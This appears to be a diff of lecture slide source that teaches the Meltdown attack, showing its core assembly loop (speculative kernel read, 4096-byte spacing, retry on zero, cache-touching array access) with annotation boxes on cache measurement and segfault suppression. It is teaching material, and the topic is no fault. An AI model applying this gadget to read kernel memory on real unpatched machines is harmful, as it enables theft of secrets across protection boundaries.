@@ -14,18 +14,47 @@
     // %rbx = array to load from to cause eviction
     xor %rax, %rax      // rax &lt;- 0
 retry:
-    // rax &lt;- memory\[kernel address] (segfaults)
+    // rax &lt;- memory[kernel address] (segfaults)
     // but check for segfault done out-of-order on Intel at time
     <span data-fragment-index="5" class="fragment custom myem-only">movb (%rcx), %al</span>
-    // rax &lt;- memory\[kernel address] * 4096 \[speculated]
+    // rax &lt;- memory[kernel address] * 4096 \[speculated]
     <span data-fragment-index="2" class="fragment custom myem-only">shl $0xC, %rax</span>
     <span data-fragment-index="3" class="fragment custom myem-only">jz retry</span>            // not-taken branch
-    // access array\[memory\[kernel address] * 4096]
+    // access array[memory[kernel address] * 4096]
     <span data-fragment-index="4" class="fragment custom myem-only">mov (%rbx, %rax), %rbx</span>
 </code></pre>
- ![](/spectre/texfig/meltdown-code.figure-1.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=1}
-![](/spectre/texfig/meltdown-code.figure-2.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=2}
-![](/spectre/texfig/meltdown-code.figure-3.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=3}
-![](/spectre/texfig/meltdown-code.figure-4.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=4}
-![](/spectre/texfig/meltdown-code.figure-5.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=5}
+
+::: {.myoverbox .fragment fragment-index=2 .fade-in-then-out}
+
+space out accessed by 4096  <br/>
+ensure sepaqrate cache sets and <br/>
+avoid triggering prefetcher
+
+:::
+
+
+::: {.myoverbox .fragment fragment-index=3 .fade-in-then-out}
+
+repeat access if zero <br/>
+apparently value of zero speculatively read<br/>
+when real value not yet available
+
+:::
+
+::: {.myoverbox .fragment fragment-index=4 .fade-in-then-out}
+
+acesss cache to allow measurement in later <br />
+in paper with FLUSH+RELOAD instead of PRIME+PROBE
+
+:::
+
+::: {.myoverbox .fragment fragment-index=5 .fade-in-then-out .low}
+
+segfault actually happens eventually<br/>
+option 1: okay, just start a new process each time</br>
+option 2: suppress segfault <br/>
+(paper used (obscure) transactional memory support,<br/>
+conceptually, could have used mispredicted branch instead)
+
+:::
 
